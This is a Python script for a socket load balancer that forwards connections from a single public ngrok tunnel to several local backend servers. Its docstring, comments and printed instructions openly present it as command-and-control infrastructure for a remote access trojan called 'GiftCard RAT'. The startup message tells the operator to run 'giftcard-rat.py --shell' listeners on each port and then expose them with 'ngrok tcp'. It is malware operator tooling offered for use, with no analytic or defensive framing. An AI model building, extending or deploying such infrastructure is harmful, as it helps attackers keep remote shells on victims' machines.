#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Ngrok Load Balancer for GiftCard RAT
Forwards connections from single ngrok URL to multiple backend RAT servers
"""

import socket
import threading
import random
import time
import sys
from datetime import datetime

class NgrokLoadBalancer:
    def __init__(self, listen_port=8888, backend_ports=[8889, 8890, 8891, 8892]):
        self.listen_port = listen_port
        self.backend_ports = backend_ports
        self.active_backends = []
        self.connection_count = 0
        self.client_connections = {}
        
    def check_backend_health(self):
        """Check which backend servers are available"""
        self.active_backends = []
        for port in self.backend_ports:
            try:
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.settimeout(2)
                result = test_socket.connect_ex(('localhost', port))
                test_socket.close()
                
                if result == 0:
                    self.active_backends.append(port)
            except:
                pass
        return len(self.active_backends) > 0
    
    def get_available_backend(self):
        """Get a random available backend server"""
        if not self.check_backend_health():
            return None
        return random.choice(self.active_backends)
    
    def handle_client(self, client_socket, client_addr):
        """Forward client connection to available backend"""
        client_id = f"{client_addr[0]}:{client_addr[1]}"
        self.connection_count += 1
        connection_num = self.connection_count
        
        backend_port = self.get_available_backend()
        
        if not backend_port:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ No backend servers available for {client_id}")
            try:
                client_socket.close()
            except:
                pass
            return
        
        try:
            # Connect to backend server
            backend_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backend_socket.settimeout(10)
            backend_socket.connect(('localhost', backend_port))
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔄 Connection #{connection_num}: {client_id} -> Backend Port {backend_port}")
            
            # Store connection info
            self.client_connections[connection_num] = {
                'client_addr': client_addr,
                'backend_port': backend_port,
                'start_time': datetime.now()
            }
            
            # Start forwarding data in both directions
            client_to_backend = threading.Thread(
                target=self.forward_data,
                args=(client_socket, backend_socket, f"C{connection_num}->B{backend_port}", connection_num)
            )
            backend_to_client = threading.Thread(
                target=self.forward_data,
                args=(backend_socket, client_socket, f"B{backend_port}->C{connection_num}", connection_num)
            )
            
            client_to_backend.daemon = True
            backend_to_client.daemon = True
            
            client_to_backend.start()
            backend_to_client.start()
            
            # Wait for either connection to close
            client_to_backend.join()
            backend_to_client.join()
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Error forwarding connection #{connection_num}: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
            try:
                backend_socket.close()
            except:
                pass
            
            # Remove from active connections
            if connection_num in self.client_connections:
                duration = datetime.now() - self.client_connections[connection_num]['start_time']
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔌 Connection #{connection_num} closed (duration: {duration})")
                del self.client_connections[connection_num]
    
    def forward_data(self, source, destination, label, connection_num):
        """Forward data from source to destination socket"""
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break
                destination.send(data)
        except Exception as e:
            # Connection closed is expected, don't spam logs
            pass
    
    def print_status(self):
        """Print status information"""
        while True:
            try:
                time.sleep(30)  # Print status every 30 seconds
                self.check_backend_health()
                active_connections = len(self.client_connections)
                
                print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 📊 Load Balancer Status:")
                print(f"  Active backends: {len(self.active_backends)}/{len(self.backend_ports)} (ports: {self.active_backends})")
                print(f"  Active connections: {active_connections}")
                print(f"  Total connections handled: {self.connection_count}")
                
                if active_connections > 0:
                    print("  Current connections:")
                    for conn_id, info in self.client_connections.items():
                        duration = datetime.now() - info['start_time']
                        print(f"    #{conn_id}: {info['client_addr']} -> Port {info['backend_port']} ({duration})")
                
                print("-" * 50)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Status thread error: {e}")
    
    def start_loadbalancer(self):
        """Start the load balancer server"""
        # Check if backend servers are running
        print("🔍 Checking backend servers...")
        if not self.check_backend_health():
            print("❌ No backend servers are running!")
            print("Please start your RAT servers first:")
            for port in self.backend_ports:
                print(f"   python giftcard-rat.py --shell -i 127.0.0.1 -p {port}")
            print("\nThen run this load balancer again.")
            return
        
        print(f"✅ Found {len(self.active_backends)} active backend servers: {self.active_backends}")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind(('0.0.0.0', self.listen_port))
            server_socket.listen(20)
            
            print(f"\n🚀 GiftCard RAT Load Balancer Started")
            print(f"📡 Listening on: 0.0.0.0:{self.listen_port}")
            print(f"🎯 Backend servers: {self.backend_ports}")
            print(f"✅ Active backends: {self.active_backends}")
            print("=" * 60)
            print("💡 Now start your ngrok tunnel:")
            print(f"   ngrok tcp {self.listen_port}")
            print("=" * 60)
            
            # Start status monitoring thread
            status_thread = threading.Thread(target=self.print_status)
            status_thread.daemon = True
            status_thread.start()
            
            while True:
                try:
                    client_socket, client_addr = server_socket.accept()
                    
                    # Handle each client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except Exception as e:
                    print(f"Accept error: {e}")
                    
        except KeyboardInterrupt:
            print("\n\n🛑 Stopping load balancer...")
        except Exception as e:
            print(f"❌ Load balancer error: {e}")
        finally:
            server_socket.close()
            print("👋 Load balancer stopped.")

def main():
    # Configuration
    NGROK_PORT = 8888        # Port that ngrok will expose (and this load balancer listens on)
    BACKEND_PORTS = [8889, 8890, 8891, 8892]  # Your actual RAT servers
    
    print("🎯 GiftCard RAT Ngrok Load Balancer")
    print("=" * 40)
    
    if len(sys.argv) > 1:
        try:
            NGROK_PORT = int(sys.argv[1])
            print(f"📡 Using custom ngrok port: {NGROK_PORT}")
        except:
            print("❌ Invalid port specified, using default 8888")
    
    if len(sys.argv) > 2:
        try:
            backend_start = int(sys.argv[2])
            BACKEND_PORTS = [backend_start + i for i in range(4)]
            print(f"🎯 Using custom backend ports: {BACKEND_PORTS}")
        except:
            print("❌ Invalid backend start port, using defaults")
    
    loadbalancer = NgrokLoadBalancer(NGROK_PORT, BACKEND_PORTS)
    loadbalancer.start_loadbalancer()

if __name__ == "__main__":
    main()